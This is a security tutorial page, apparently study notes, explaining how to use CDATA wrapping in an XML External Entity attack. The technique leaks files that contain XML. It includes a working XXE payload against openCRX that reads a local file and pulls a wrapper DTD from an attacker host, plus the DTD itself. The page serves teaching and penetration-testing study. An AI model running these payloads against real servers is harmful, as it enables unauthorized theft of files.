## Advanced file access with CDATA

We initially discuss XML External Entities (XXE) exploits in
[[xml-external-entities#Retrieving files|XML External Entities, Retrieving Files]], however, the
examples provided don't account for the content we're trying to leak being valid XML, causing the
XML parser to parse the contents of the file we're trying to leak. This likely causes the parser to
prematurely halt the processing of our data.

Using the [CDATA](https://en.wikipedia.org/wiki/CDATA) directive, we can instruct XML to ignore
parsing elements within our data - just give us the raw information from the file referenced. Here's
an example XXE payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file://{FILEPATH}" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://{LHOST}:{LPORT}/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

In the above example, we define the `start` entity to be the start of the `CDATA` XML entity. We
specify which file we want to leak with the `file` entity. Finally, we end the `CDATA` XML entity
with the `end` entity. How do we end up combining these elements?

We host a [Document Type Definition (DTD)](https://www.w3schools.com/xml/xml_dtd.asp) and reference
it as an external entity. This external entity will combine the `start`, `file`, and `end` entities
as one final entity, `wrapper`. We invoke the `dtd` entity, causing the victim host's XML parser to
download the `wrapper.dtd` DTD file from our attacker host. The contents of the `wrapper.dtd`
payload are provided below:

```xml
<!ENTITY wrapper "%start;%file;%end;">
```

Once the victim host successfully download's the `wrapper.dtd` DTD file, we invoke the `wrapper`
entity, causing the victim host to retrieve the file specified by the `file` entity, and placing it
in our `CDATA` entity for easy exposure without XML parsing.
